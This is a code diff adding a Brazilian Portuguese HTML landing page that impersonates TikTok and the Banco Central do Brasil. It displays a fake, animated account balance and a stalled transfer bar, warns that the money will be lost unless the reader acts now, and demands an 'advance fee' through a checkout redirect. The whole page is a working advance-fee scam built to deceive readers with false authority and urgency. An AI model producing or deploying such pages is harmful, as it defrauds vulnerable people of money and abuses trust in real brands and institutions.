@@ -1,0 +1,480 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head> 
+<script
+			src="https://cdn.jsdelivr.net/gh/xTracky/static@latest/utm-handler.js"
+			data-token="42b3781d-2074-4387-ac36-a7dd7dd3ef11"
+	>
+	</script>
+<script
+        src="https://cdn.jsdelivr.net/gh/xTracky/static@latest/utm-handler.js"
+        data-token="634f51e3-ed49-43e9-9e73-94d196bba475"
+        data-click-id-param="click_id"
+>
+</script>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="robots" content="max-image-preview:large">
+    <title>TikTok - Transferência Interrompida</title>
+    <!-- TikTok Pixel Code Start -->
+    <script>
+      !(function (w, d, t) {
+        w.TiktokAnalyticsObject = t;
+        var ttq = (w[t] = w[t] || []);
+        (ttq.methods = [
+          "page",
+          "track",
+          "identify",
+          "instances",
+          "debug",
+          "on",
+          "off",
+          "once",
+          "ready",
+          "alias",
+          "group",
+          "enableCookie",
+          "disableCookie",
+          "holdConsent",
+          "revokeConsent",
+          "grantConsent",
+        ]),
+          (ttq.setAndDefer = function (t, e) {
+            t[e] = function () {
+              t.push([e].concat(Array.prototype.slice.call(arguments, 0)));
+            };
+          });
+        for (var i = 0; i < ttq.methods.length; i++)
+          ttq.setAndDefer(ttq, ttq.methods[i]);
+        (ttq.instance = function (t) {
+          for (var e = ttq._i[t] || [], n = 0; n < ttq.methods.length; n++)
+            ttq.setAndDefer(e, ttq.methods[n]);
+          return e;
+        }),
+          (ttq.load = function (e, n) {
+            var r = "https://analytics.tiktok.com/i18n/pixel/events.js",
+              o = n && n.partner;
+            (ttq._i = ttq._i || {}),
+              (ttq._i[e] = []),
+              (ttq._i[e]._u = r),
+              (ttq._t = ttq._t || {}),
+              (ttq._t[e] = +new Date()),
+              (ttq._o = ttq._o || {}),
+              (ttq._o[e] = n || {});
+            n = document.createElement("script");
+            (n.type = "text/javascript"),
+              (n.async = !0),
+              (n.src = r + "?sdkid=" + e + "&lib=" + t);
+            e = document.getElementsByTagName("script")[0];
+            e.parentNode.insertBefore(n, e);
+          });
+
+        ttq.load("D4L781BC77U4IAHDOBPG");
+        ttq.page();
+      })(window, document, "ttq");
+    </script>
+    <!-- TikTok Pixel Code End -->
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&family=Poppins:wght@400;500;600;700&display=swap" rel="stylesheet"/>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        :root {
+            --kwai-orange: #FE2C55;
+            --kwai-dark: #181212;
+            --kwai-light: #FFF5EF;
+            --kwai-yellow: #FFD600;
+            --kwai-red: #FF3D00;
+        }
+        
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Inter', 'Poppins', sans-serif;
+        }
+        
+        body {
+            background: linear-gradient(135deg, var(--kwai-light) 0%, #ffffff 100%);
+            color: var(--kwai-dark);
+            line-height: 1.6;
+            min-height: 100vh;
+            padding: 20px;
+        }
+        
+        .container {
+            max-width: 600px;
+            width: 100%;
+            margin: 0 auto;
+        }
+        
+        .header {
+            background: linear-gradient(135deg, var(--kwai-orange) 0%, #d91e4a 100%);
+            padding: 20px;
+            text-align: center;
+            box-shadow: 0 4px 15px rgba(254, 44, 85, 0.3);
+            border-radius: 16px 16px 0 0;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            gap: 15px;
+        }
+        
+        .logo-container {
+            flex: 1;
+            text-align: left;
+        }
+        
+        .logo-container img {
+            height: 40px;
+            filter: drop-shadow(0 2px 8px rgba(0, 0, 0, 0.2));
+        }
+        
+        .boxSaldo {
+            background: rgba(0, 0, 0, 0.2);
+            border-radius: 12px;
+            padding: 12px 20px;
+            text-align: center;
+            flex: 1;
+        }
+        
+        .textoSaldo {
+            background-color: rgba(0, 0, 0, 0.3);
+            color: white;
+            padding: 4px 12px;
+            border-radius: 6px;
+            font-size: 0.75rem;
+            font-weight: 700;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            display: inline-block;
+            margin-bottom: 5px;
+        }
+        
+        .valorSaldo {
+            color: white;
+            font-size: 1.5rem;
+            font-weight: 700;
+            margin: 0;
+            font-family: 'Inter', sans-serif;
+        }
+        
+        .alert-box {
+            background: linear-gradient(135deg, rgba(255, 61, 0, 0.15) 0%, rgba(255, 61, 0, 0.08) 100%);
+            border: 2px solid var(--kwai-red);
+            border-radius: 12px;
+            padding: 18px;
+            margin: 20px 0;
+            text-align: center;
+            box-shadow: 0 4px 12px rgba(255, 61, 0, 0.2);
+        }
+        
+        .alert-box p {
+            margin: 0;
+            font-size: 0.95rem;
+            line-height: 1.7;
+            color: #333;
+            font-weight: 600;
+        }
+        
+        .alert-box strong {
+            color: var(--kwai-red);
+            font-weight: 700;
+        }
+        
+        .content-container {
+            background: #ffffff;
+            border-radius: 0 0 16px 16px;
+            padding: 35px 30px;
+            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.15);
+            border: 2px solid rgba(254, 44, 85, 0.2);
+            margin-bottom: 20px;
+        }
+        
+        .gif-container {
+            text-align: center;
+            margin-bottom: 20px;
+        }
+        
+        .gif-container img {
+            width: 150px;
+            height: auto;
+        }
+        
+        .progress-container {
+            width: 100%;
+            background-color: #e9ecef;
+            border-radius: 10px;
+            overflow: hidden;
+            margin: 20px 0;
+            height: 35px;
+            box-shadow: inset 0 2px 4px rgba(0, 0, 0, 0.1);
+        }
+        
+        .progress-bar {
+            width: 0%;
+            height: 100%;
+            border-radius: 10px;
+            background: linear-gradient(135deg, #5fb4ff 0%, #4a9eff 100%);
+            text-align: center;
+            line-height: 35px;
+            color: white;
+            font-weight: 700;
+            font-size: 0.9rem;
+            transition: width 0.1s ease-in-out;
+            box-shadow: 0 2px 8px rgba(95, 180, 255, 0.3);
+        }
+        
+        .status-title {
+            font-size: 1.4rem;
+            font-weight: 700;
+            color: var(--kwai-orange);
+            text-align: center;
+            margin-bottom: 15px;
+        }
+        
+        .status-description {
+            font-size: 1rem;
+            line-height: 1.8;
+            color: #333;
+            margin-bottom: 20px;
+        }
+        
+        .info-box {
+            background: linear-gradient(135deg, rgba(255, 214, 0, 0.15) 0%, rgba(255, 214, 0, 0.05) 100%);
+            border-left: 4px solid var(--kwai-yellow);
+            border-radius: 12px;
+            padding: 20px;
+            margin: 25px 0;
+            box-shadow: 0 2px 8px rgba(255, 214, 0, 0.1);
+        }
+        
+        .info-box p {
+            margin: 0;
+            font-size: 1rem;
+            line-height: 1.7;
+            color: #333;
+        }
+        
+        .info-box strong {
+            color: var(--kwai-orange);
+            font-weight: 700;
+        }
+        
+        .guarantee-badges {
+            display: flex;
+            justify-content: center;
+            gap: 6px;
+            flex-wrap: nowrap;
+            margin: 20px 0;
+        }
+        
+        .badge {
+            display: inline-flex;
+            align-items: center;
+            gap: 4px;
+            background: #f8f9fa;
+            color: #495057;
+            padding: 5px 10px;
+            border-radius: 20px;
+            font-size: 0.7rem;
+            font-weight: 500;
+            border: 1px solid #e9ecef;
+            white-space: nowrap;
+            flex-shrink: 0;
+        }
+        
+        .badge i {
+            color: var(--kwai-orange);
+            font-size: 0.85rem;
+        }
+        
+        button {
+            background: linear-gradient(135deg, var(--kwai-red) 0%, #e63900 100%);
+            color: white;
+            border: none;
+            padding: 18px 40px;
+            font-size: 1.05rem;
+            font-weight: 700;
+            border-radius: 12px;
+            width: 100%;
+            cursor: pointer;
+            margin: 25px 0;
+            box-shadow: 0 8px 24px rgba(255, 61, 0, 0.3);
+            transition: all 0.3s ease;
+            text-align: center;
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+        }
+        
+        button:hover {
+            background: linear-gradient(135deg, #e63900 0%, var(--kwai-red) 100%);
+            transform: translateY(-2px);
+            box-shadow: 0 12px 32px rgba(255, 61, 0, 0.4);
+        }
+        
+        button:active {
+            transform: translateY(0);
+        }
+        
+        button i {
+            font-size: 1.1rem;
+        }
+        
+        .footer {
+            text-align: center;
+            font-size: 0.8rem;
+            color: #666;
+            margin-top: 30px;
+            padding: 20px;
+        }
+        
+        @media (max-width: 480px) {
+            .header {
+                flex-direction: column;
+                padding: 15px;
+            }
+            
+            .boxSaldo {
+                width: 100%;
+            }
+            
+            .content-container {
+                padding: 25px 20px;
+            }
+            
+            .status-title {
+                font-size: 1.2rem;
+            }
+            
+            .status-description {
+                font-size: 0.95rem;
+            }
+            
+            button {
+                padding: 16px 30px;
+                font-size: 0.95rem;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <div class="logo-container">
+                <img src="images/tik.png" alt="TikTok Logo">
+            </div>
+            <div class="boxSaldo">
+                <label class="textoSaldo">Saldo</label>
+                <p class="valorSaldo">R$ <span class="saldoAtualizado">609.00</span></p>
+            </div>
+        </div>
+        
+        <div class="alert-box">
+            <p><strong><i class="fas fa-exclamation-triangle"></i> Atenção:</strong> Caso não saque o dinheiro de imediato, ele será enviado para um fundo de doação e perderá 100% do saldo!</p>
+        </div>
+        
+        <div class="content-container">
+            <div class="gif-container">
+                <img src="images/saque.gif" alt="Transferência">
+            </div>
+            
+            <div class="progress-container">
+                <div id="myProgressBar" class="progress-bar" style="width: 52%;">52%</div>
+            </div>
+            
+            <h2 class="status-title">
+                <i class="fas fa-exclamation-circle"></i> Transferência Interrompida!
+            </h2>
+            
+            <div class="status-description">
+                <p>Seu saldo foi enviado com sucesso mas a transferência foi interrompida pelo <strong>Banco Central do Brasil</strong>.</p>
+                
+                <p style="margin-top: 15px;">Muitos usuários estão recebendo propostas similares e fraudulentas por conta disso, deve ser pago uma tarifa do <strong>Adiantamento</strong> com valor simbólico ao Banco Central do Brasil apenas para validação e segurança e será extornado em até 3 minutos após o pagamento.</p>
+            </div>
+            
+            <div class="info-box">
+                <p><strong><i class="fas fa-check-circle"></i> Após o pagamento da tarifa o saldo será desbloqueado e enviado imediatamente para a chave Pix cadastrada!</strong></p>
+            </div>
+            
+            <div class="guarantee-badges">
+                <div class="badge">
+                    <i class="fas fa-shield-alt"></i>
+                    <span>100% Seguro</span>
+                </div>
+                <div class="badge">
+                    <i class="fas fa-lock"></i>
+                    <span>SSL</span>
+                </div>
+                <div class="badge">
+                    <i class="fas fa-certificate"></i>
+                    <span>Garantido</span>
+                </div>
+            </div>
+            
+            <button id="paymentButton">
+                <i class="fas fa-credit-card"></i>
+                <span>Pagar Tarifa e Receber</span>
+            </button>
+        </div>
+        
+        <div class="footer">
+            <p>TikTok, 2024.<br>Todos direitos reservados</p>
+        </div>
+    </div>
+    
+    <script>
+        document.addEventListener("DOMContentLoaded", function() {
+            const saldoElemento = document.querySelector('.saldoAtualizado');
+            const saldoFinal = 644.24;
+            const saldoInicial = 609.00;
+            const duracao = 2000;
+            const passos = 100;
+            const incremento = (saldoFinal - saldoInicial) / passos;
+            const tempo = duracao / passos;
+    
+            let saldoAtual = saldoInicial;
+    
+            function atualizarSaldo() {
+                saldoAtual += incremento;
+                saldoElemento.textContent = saldoAtual.toFixed(2);
+                
+                if (saldoAtual < saldoFinal) {
+                    setTimeout(atualizarSaldo, tempo);
+                } else {
+                    saldoElemento.textContent = saldoFinal.toFixed(2);
+                }
+            }
+    
+            atualizarSaldo();
+        });
+    </script>
+    
+    <script>
+        function updateProgressBar() {
+            const progressBar = document.getElementById('myProgressBar');
+            let width = 52;
+            const interval = setInterval(() => {
+                if (width >= 90) {
+                    clearInterval(interval);
+                } else {
+                    width++;
+                    progressBar.style.width = width + '%';
+                    progressBar.textContent = width + '%';
+                }
+            }, 10);
+        }
+
+        window.onload = updateProgressBar;
+
+        document.getElementById('paymentButton').addEventListener('click', function() {
+            const urlParams = new URLSearchParams(window.location.search);
+            const queryString = urlParams.toString();
+            window.location.href = "/up4/checkout/index.html" + (queryString ? "?" + queryString : "");
+        });
+    </script>
+</body>
+</html>
